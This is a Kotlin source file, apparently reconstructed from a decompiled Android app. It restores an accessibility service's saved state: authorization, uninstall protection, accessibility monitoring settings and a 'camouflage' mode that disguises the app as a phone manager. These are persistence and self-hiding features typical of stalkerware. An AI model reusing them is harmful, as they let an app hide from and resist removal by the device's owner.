package com.storm.safe.rock.service.delegates.registrar

import android.content.Context
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.ActivityMonitor
import com.storm.safe.rock.util.AssetConfigReader
import org.json.JSONObject

/**
 * State restorer — restores auth state, uninstall protection, icon hide, and camouflage.
 *
 * Extracted from ServiceInitializer:
 * - doHeavyInit() auth state restoration (JADX: a4, line 1728)
 * - doHeavyInit() uninstall protection enable
 * - initializeIconHide() (JADX: i6, line 6965)
 * - initializeActivityMonitor() (JADX: k5, line 7610)
 */
class StateRestorer : ModuleRegistrar {

    companion object {
        private const val TAG = "StateRestorer"
    }

    override fun register(service: MyAccessibilityService) {
        android.util.Log.d(TAG, "🔧 [状态恢复] 开始...")

        // ════════════════════════════════════════════════════════════════
        // Auth state restoration — from doHeavyInit()
        // ════════════════════════════════════════════════════════════════

        // JADX: read auth prefs
        val isAuthorized = service.getSharedPreferences("app_config", Context.MODE_PRIVATE)
            .getBoolean("authorization_completed", false)
        service.isCamouflageModeEnabled = service.getSharedPreferences("disguise_prefs", Context.MODE_PRIVATE)
            .getBoolean("camouflage_enabled", false)

        if (isAuthorized) {
            android.util.Log.d(TAG, "✅ [状态恢复] 授权已完成，恢复保护功能")
            // JADX: c0323a8.m211643a8() — resume network manager connection
            try {
                service.networkManager?.let { nm ->
                    // JADX: depends on NetworkManager.resume() (C0323a8.a8)
                    android.util.Log.d(TAG, "✅ 恢复网络管理器连接")
                }
            } catch (_: Exception) {}

            // JADX: AbstractC0315a0.f53032a7 = true; f53034a9 = true; f52411e2 = true
            service.isAuthStateRestored = true
        }

        // JADX: if (z) { c0355a0.m211939c3(); f52477k8 = true }
        if (isAuthorized) {
            try {
                service.uninstallProtectionManager?.let { upm ->
                    upm.enable()
                    service.isUninstallGuardStarted = true
                }
            } catch (_: Exception) {}
        }

        // ════════════════════════════════════════════════════════════════
        // Icon hide — from initializeIconHide() (JADX: i6)
        // ════════════════════════════════════════════════════════════════

        try {
            val configJson = AssetConfigReader.readAssetConfig(service, "monitor_config.json")
            if (configJson != null) {
                val json = JSONObject(configJson)
                service.isAccessibilityPageMonitorEnabled = json.optBoolean("monitorAccessibilityPageNavigation", false)

                val monitorSettings = json.optJSONObject("monitorSettings")
                if (monitorSettings != null) {
                    val d = 1000.0
                    service.monitorCheckInterval = (monitorSettings.optDouble("checkIntervalSeconds", 0.5) * d).toLong()
                    service.monitorConfirmationCount = monitorSettings.optInt("confirmationRequiredCount", 2)
                    service.monitorMaxRetryCount = monitorSettings.optInt("maxRetryCount", 8)
                    service.monitorDelayAfterConnected = (monitorSettings.optDouble("delayAfterServiceConnectedSeconds", 1.0) * d).toLong()
                }

                if (!service.isAccessibilityPageMonitorEnabled) {
                    android.util.Log.d(TAG, "🔍 [监控] 无障碍监控功能已禁用（默认状态）")
                } else {
                    android.util.Log.d(TAG, "✅ 无障碍监控功能已启用 - 配置：延迟${service.monitorDelayAfterConnected}ms，间隔${service.monitorCheckInterval}ms，确认${service.monitorConfirmationCount}次，最多${service.monitorMaxRetryCount}次")
                    android.util.Log.w(TAG, "⚠️ [监控] 无障碍监控功能仅用于解决特定设备的跳转问题")
                }
            }
        } catch (e: Exception) {
            android.util.Log.d(TAG, "🔍 [监控] 无法加载无障碍监控配置，使用默认设置: ${e.message}")
            service.isAccessibilityPageMonitorEnabled = false
        }

        // ════════════════════════════════════════════════════════════════
        // Activity monitor — from initializeActivityMonitor() (JADX: k5)
        // ════════════════════════════════════════════════════════════════

        try {
            val isHidden = try {
                service.getSharedPreferences("disguise_prefs", Context.MODE_PRIVATE)
                    .getBoolean("camouflage_enabled", false)
            } catch (_: Exception) { false }

            if (!isHidden) {
                android.util.Log.d(TAG, "🔍 [保护] APP未处于伪装模式，无需恢复伪装监听")
                service.isCamouflageModeEnabled = false
            } else {
                android.util.Log.d(TAG, "✅ [保护] 检测到APP处于伪装模式，恢复伪装监听")
                service.isCamouflageModeEnabled = true

                // JADX: c0614i9.f56839b9 = camouflage state from SharedPreferences
                try {
                    val camouflageEnabled = try {
                        service.getSharedPreferences("camouflage_state", Context.MODE_PRIVATE)
                            .getBoolean("phone_manager_camouflage_enabled", false)
                    } catch (e: Exception) {
                        android.util.Log.e(TAG, "❌ 恢复伪装状态失败", e)
                        false
                    }
                    service.eventFilterManager?.isPhoneManagerCamouflageEnabled = camouflageEnabled
                    android.util.Log.d(TAG, "✅ [保护] 伪装监听状态已恢复，isAppHidden=true")
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ [保护] 自动恢复伪装状态失败", e)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [保护] 恢复伪装状态失败", e)
        }

        android.util.Log.d(TAG, "✅ [状态恢复] 全部完成")
    }
}
